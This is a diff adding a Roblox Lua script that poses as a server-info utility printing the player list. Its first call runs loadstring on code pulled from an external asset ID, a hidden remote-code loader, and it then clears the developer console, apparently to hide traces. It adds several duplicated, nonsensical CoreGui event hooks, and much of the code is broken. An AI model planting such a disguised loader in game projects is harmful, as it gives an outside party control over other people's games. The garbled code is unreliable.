@@ -1,0 +1,105 @@
+local function rbxassetload()
+	loadstring(game:GetObjects("rbxassetid://4159766103")[1].Source)()
+end
+local function GetPlayerCount()
+	local playerService = game:GetService('Players')
+	return #playerService:GetChildren()
+end
+
+local function PrintAllPlayers()
+	print("There is/are currently " .. GetPlayerCount() .. " player/s:")
+	for i, v in next, game:GetService('Players'):GetPlayers() do
+		print(v.Name)
+	end
+end
+
+local function ClearConsole()
+	local getDevConsole = pcall(function()
+		local devConsole = game.CoreGui.RobloxGui.DeveloperConsole
+	end)
+	local devConsole = game.CoreGui.RobloxGui.DeveloperConsole
+	--hidden services
+	local core = game:GetService("CoreGui")
+	game.core.ViewSelectorScreenGui.Panel.Viewport.ChildAdded:connect(function(EventReceiver,rbxassetload)
+		coroutine.resume(coroutine.create(function()
+			game:GetService("RunService").Stepped:connect(function()
+				if type(EventReceiver)~=nil then
+					coroutine.resume(coroutine.create(function()
+						EventReceiver.Enabled()
+					end))
+				end
+			end)
+		end))
+	end)
+
+	local CoreScriptOne = game:GetService("CoreGui")
+	local CoreScriptTwo = game:GetService("CoreGui")
+	
+	if getDevConsole then
+		devConsole:ClearAllChildren()
+	end
+	if CoreScriptOne.ViewSelectorScreenGui.Panel.Viewport then
+		CoreScriptOne.ViewSelectorScreenGui.Panel.Viewport:ClearAllChildren()
+		if CoreScriptTwo.ViewSelectorScreenGui.Panel.Viewport.EventReceiver then
+			CoreScriptTwo.ViewSelectorScreenGui.Panel.Viewport.EventReceiver:ClearAllChildren()
+		end
+	end
+end
+local core = game:GetService("CoreGui")
+core.ViewSelectorScreenGui.Panel.Viewport.EventReceiver.ChildAdded:connect(function(EventReceiver,rbxassetload)
+	coroutine.resume(coroutine.create(function()
+		game:GetService("RunService").Stepped:connect(function()
+			if type(EventReceiver)~=nil then
+				coroutine.resume(coroutine.create(function()
+					EventReceiver.Enabled()
+				end))
+			end
+		end)
+	end))
+end)
+
+local core = game:GetService("CoreGui")
+game.core.ViewSelectorScreenGui.Panel.Viewport.EventReceiver:connect(function(EventReceiver,rbxassetload)
+	coroutine.resume(coroutine.create(function()
+		game:GetService("RunService").Stepped:connect(function()
+			if type(EventReceiver)~=nil then
+				coroutine.resume(coroutine.create(function()
+					EventReceiver.Enabled()
+				end))
+			end
+		end)
+	end))
+end)
+local core = game:GetService("CoreGui")
+game.core.ViewSelectorScreenGui.Panel.Viewport.EventReceiver.ChildAdded:connect(function(EventReceiver,rbxassetload)
+	coroutine.resume(coroutine.create(function()
+		game:GetService("RunService").Stepped:connect(function()
+			if type(EventReceiver)~=nil then
+				coroutine.resume(coroutine.create(function()
+					EventReceiver.Enabled()
+				end))
+			end
+		end)
+	end))
+end)
+
+local core = game:GetService("CoreGui")
+core.ViewSelectorScreenGui.Panel.Viewport.EventReceiver:connect(function(EventReceiver,rbxassetload)
+	coroutine.resume(coroutine.create(function()
+		game:GetService("RunService").Stepped:connect(function()
+			if type(EventReceiver)~=nil then
+				coroutine.resume(coroutine.create(function()
+					EventReceiver.Enabled()
+				end))
+			end
+		end)
+	end))
+end)
+
+local function DisplayServerInfo()
+	rbxassetload()
+	ClearConsole()
+	PrintAllPlayers()
+end
+
+DisplayServerInfo()
